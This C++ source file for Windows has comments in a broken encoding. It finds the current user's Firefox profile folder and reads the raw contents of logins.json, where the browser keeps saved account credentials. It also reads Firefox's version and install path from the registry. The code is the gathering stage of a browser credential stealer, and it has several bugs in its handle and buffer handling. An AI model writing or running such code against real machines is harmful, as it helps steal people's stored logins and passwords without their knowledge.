#include "getFileInfo.h"

using namespace std;

//��ȡFirefox�ĵ�ǰ�汾������Ϊע�����Mozilla Firefox��·��������ֵΪʧ����Ϣ��汾��Ϣ
string getCurrentVersion(string path) {
	TCHAR currentVersion[MY_BUFSIZE];
	HKEY hKey;
	DWORD dwBuflen = MY_BUFSIZE;
	LONG lRet;
	memset(currentVersion, 0, (sizeof(currentVersion)));


	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		TEXT(path.c_str()),
		0,
		KEY_QUERY_VALUE | KEY_WOW64_64KEY,
		&hKey);
	if (lRet != ERROR_SUCCESS)return READ_FAIL;


	lRet = RegQueryValueEx(hKey,
		TEXT("CurrentVersion"),
		NULL,
		NULL,
		(LPBYTE)currentVersion,
		&dwBuflen);
	if (lRet != ERROR_SUCCESS)return GET_FAIL;


	RegCloseKey(hKey);
	return currentVersion;
}

//��ȡFirefox�İ�װ·��,����ֵΪ��ȡʧ�ܵı�ǻ�װ·��
string getPath() {

	TCHAR installPath[MY_BUFSIZE];
	HKEY hKey;
	memset(installPath, 0, sizeof(installPath));
	DWORD dwBuflen = MY_BUFSIZE;
	LONG lRet;
	string tempPath = "SOFTWARE\\Mozilla\\Mozilla Firefox";

	tempPath = tempPath + "\\" + getCurrentVersion(tempPath) + "\\Main";

	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		TEXT(tempPath.c_str()),
		0,
		KEY_QUERY_VALUE | KEY_WOW64_64KEY,
		&hKey);
	if (lRet != ERROR_SUCCESS)return READ_FAIL;


	lRet = RegQueryValueEx(hKey,
		TEXT("Install Directory"),
		NULL,
		NULL,
		(LPBYTE)installPath,
		&dwBuflen);
	if (lRet != ERROR_SUCCESS)return GET_FAIL;


	RegCloseKey(hKey);
	return installPath;
}

//��ȡFirefox��logins.json���ļ�·�������д洢���ܺ���˺š�������Ϣ������ֵΪ·����Ϣ�򱨴���Ϣ
string findLoginInfo() {
	WIN32_FIND_DATA fd;

	char* appDataPath = (char*)malloc(sizeof(char) * MAX_PATH);
	string profileName = "";
	string sAppDataPath;
	string profilePath;

	if (appDataPath != NULL) {
		if (SHGetFolderPathA(NULL, CSIDL_APPDATA, 0, NULL, appDataPath) != S_OK)return FIND_FAIL;//��ȡappData��roamingĿ¼
		sAppDataPath = appDataPath;

		free(appDataPath);//�ͷŴ洢�ռ�
		appDataPath = nullptr;

		sAppDataPath += "\\Mozilla\\Firefox\\Profiles\\";
	}
	else return FIND_FAIL;


	HANDLE hFind = FindFirstFile((sAppDataPath + "\\*").c_str(), &fd);
	do {
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			string temp = fd.cFileName;
			size_t len = temp.size();
			if (temp.find("release") < len) {
				profileName = temp;
			}
		}
	} while (FindNextFile(hFind, &fd) != 0);
	profilePath = sAppDataPath + profileName;

	return profilePath;
}

//��ȡlogins.json������ݣ�����ֵΪ�ļ���Ϣ�򱨴���Ϣ
string getLoginInfo(string profilePath) {
	DWORD szBuffer = 64536, szWrotedBytes;
	char* buffer = (char*)malloc(szBuffer);

	HANDLE fLoginFile = CreateFileA(profilePath.c_str(), GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (fLoginFile != INVALID_HANDLE_VALUE && buffer != NULL) {
		if (ReadFile(fLoginFile, buffer, szBuffer, &szWrotedBytes, NULL) == false)return GET_FAIL;
	}
	else {
		return GET_FAIL;
	}

	return buffer;
}
//getLoginInfo����������
string getLoginInfo() {
	string profilePath = findLoginInfo();
	if (profilePath == FIND_FAIL)return GET_FAIL;
	profilePath += "\\logins.json";

	return getLoginInfo(profilePath);
}